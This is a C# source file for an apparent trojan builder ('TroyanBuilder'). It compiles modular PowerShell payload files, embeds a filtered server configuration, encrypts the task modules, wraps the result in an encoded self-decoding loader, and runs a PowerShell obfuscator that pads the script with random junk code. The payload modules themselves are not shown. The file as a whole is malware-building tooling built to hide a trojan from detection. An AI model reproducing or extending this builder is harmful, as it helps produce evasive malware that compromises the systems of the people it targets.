using System.Diagnostics.CodeAnalysis;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using model;

namespace TroyanBuilder;

[SuppressMessage("ReSharper", "MemberCanBePrivate.Global")]
public abstract partial class CustomBuilder
{
    protected abstract string SourceDir {get;}
    
    protected abstract string OutputFile { get; }

    private string OutputFilePre => Path.ChangeExtension(OutputFile, ".pre.ps1");
    
    private string OutputFileNonObfuscated => Path.ChangeExtension(OutputFile, ".nonobfuscated.ps1");
    
    protected abstract string EntryPoint { get; }
    protected abstract string[] PriorityTasks { get; }
    protected abstract string[] UnpriorityTasks { get; }
    
    private ServerService Svc;
    protected ServerModel Model = new();
    private List<SourceFile> SourceFiles = new();
    private List<SourceFile> DoFiles => SourceFiles
        .Where(a=> a.IsDo == true).ToList();
    private List<SourceFile> NonDoFiles => SourceFiles
        .Where(a=> a.IsDo == false).ToList();

    
    private readonly StringBuilder Builder = new();
    protected readonly List<string> Result = new();
    
    public bool IsObfuscate => (Program.ObfuscateDebug && IsDebug) || (Program.ObfuscateRelease && !IsDebug);
    
    public virtual List<string> Build(string server)
    {
        Svc = new ServerService();
        var srv = Svc.GetServer(server, true, true, "localhost");
        Model = srv.ServerModel!;
        MakeConsts();
        InternalBuild(server);
        SourceFiles = GetSourceFiles();
        CompileSources();
        var directoryPath = Path.GetDirectoryName(OutputFile);
        if (!string.IsNullOrEmpty(directoryPath) && !Directory.Exists(directoryPath))
            Directory.CreateDirectory(directoryPath);
        
        Build();
        
        File.Copy(OutputFile, OutputFileNonObfuscated, true);
        
        if (IsObfuscate)
            new PowerShellObfuscator().ObfuscateFile(OutputFile);
        
        File.Copy(OutputFile, OutputFilePre, true);
        
        if (!IsDebug)
            GeneratePowerShellScript(OutputFile, OutputFile);
      
        if (IsObfuscate)
            new PowerShellObfuscator().ObfuscateFile(OutputFile);
        PostBuild();

        return Result;
    }

    protected virtual void PostBuild()
    {
        
    }
    
    private void MakeConsts()
    {
        var template = @"
$server = @'
_SERVER
'@ | ConvertFrom-Json
";

        var keywords = new List<string>
        {
            "Dir","holder","body","operation", "troyan", "dnSponsor", "ftp", "user", "alias","_operate","StatusLabel",
            "login", "password", "ico", "domainController",
            "interfaces", "bux", "landing", "php", "domainIp"
        };

        var serverFilePath = Model.UserServerFile;
        var serverJson = File.ReadAllText(serverFilePath);
        var server = JsonNode.Parse(serverJson)!;

        JsonNode FilterObjectByKeywords(JsonNode serverObject, List<string> filterKeywords)
        {
            var filteredDictionary = serverObject.AsObject()
                .Where(kvp => !filterKeywords.Any(a=> kvp.Key.ToLower().ToLower().Contains(a.ToLower())))
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

            return JsonNode.Parse(JsonSerializer.Serialize(filteredDictionary))!;
        }

        var filteredObject = FilterObjectByKeywords(server, keywords);
        var serverJsonString = JsonSerializer.Serialize(filteredObject, new JsonSerializerOptions { WriteIndented = true });
        template = template.Replace("_SERVER", serverJsonString);

        var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_body.ps1");
        File.WriteAllText(outputPath, template);
    }
    
    private bool IsDebug => this.GetType().Name.Contains("Debug");

    private void Build()
    {
        if (IsDebug)
        {
            BuildDebug();
        }
        else
        {
            BuildRelease();
        }
    }
    
    private void BuildDebug()
    {
        foreach (var x in NonDoFiles)
        {
            Builder.Append(x.Data);
            Builder.AppendLine();
        }
        Builder.AppendLine("");
        foreach (var x in DoFiles)
        {
            Builder.Append(x.Data);
            Builder.AppendLine();
        }
        foreach (var sourceFile in DoFiles)
        {
            var doX = $"do_{sourceFile.Name}";
            Builder.AppendLine(doX);
        }
        
        File.WriteAllText(OutputFile,Builder.ToString());
    }

    private void BuildRelease()
    {
        foreach (var x in SourceFiles.Where(a=> a.Name == EntryPoint))
        {
            Builder.Append(x.Data);
            Builder.AppendLine();
        }
        Builder.AppendLine("");
        
        var psString = new StringBuilder();
        foreach (var kvp in DoFiles)
            psString.AppendLine($"    \"{kvp.Name}\" = \"{kvp.CryptedData()}\"");
        var doo = psString.ToString();
        
        var dataProd = Builder.ToString();
        var programRaw = ReadSource("program");
        (var head, var body) = ExtractHeadAndBody(programRaw.Data);
        body = body.Replace("###doo", doo);
        dataProd = head + Environment.NewLine + dataProd + Environment.NewLine + body;
        if (IsObfuscate)
            dataProd = new PowerShellObfuscator().RandomCode() + dataProd + new PowerShellObfuscator().RandomCode();
        File.WriteAllText(OutputFile,dataProd);
    }

    protected abstract void InternalBuild(string server);
    
    private void CompileSources()
    {
        for (int i = 0; i < SourceFiles.Count; i++)
        {
            var sourceFile = SourceFiles[i];
            sourceFile = ReadSource(sourceFile.Name);
            SourceFiles[i] = sourceFile;
        }
    }
    
    
    protected string PfxFile(string domain)
    {
        return Path.Combine(Model.CertDir, domain + ".pfx");
    }

  
    
    static (string Head, string Body) ExtractHeadAndBody(string input)
    {
        var lines = input.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);

        var head = new StringBuilder();
        var body = new StringBuilder();

        var headBegin = false;
        var headEnd = false;

        foreach (var line in lines)
        {
            if (line.Trim() == "###head")
            {
                if (!headBegin)
                {
                    headBegin = true;
                }
                else
                {
                    if (!headEnd)
                    {
                        headEnd = true;
                    }
                }
            }

            if ( !headBegin || (headBegin && !headEnd))
            {
                head.AppendLine(line);
            }
            else
            {
                body.AppendLine(line);
            }
        }

        return (head.ToString().Trim(), body.ToString().Trim());
    }
    
    private string GeneratePowerShellScript(string powerShellCode)
    {
        var encoded = CustomCryptor.Encode(powerShellCode);
        var data = $"$EncodedScript = \"{encoded}\"" + Environment.NewLine + ReadSource("dynamic").Data;
        return data;
    }


    public void GeneratePowerShellScript(string inFile, string outFile)
    {
        var data = File.ReadAllText(inFile);
        data = GeneratePowerShellScript(data);
        System.IO.File.WriteAllText(outFile, data);
    }
}